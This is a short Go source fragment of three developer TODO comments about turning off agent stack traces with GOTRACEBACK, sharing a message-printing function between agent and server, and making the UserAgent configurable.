// TODO Update Makefile to remove debug stacktrace for agents only. GOTRACEBACK=0 #https://dave.cheney.net/tag/gotraceback https://golang.org/pkg/runtime/debug/#SetTraceback
// TODO Add standard function for printing messages like in the JavaScript agent. Make it a lib for agent and server?
// TODO configure set UserAgent agentcontrol message
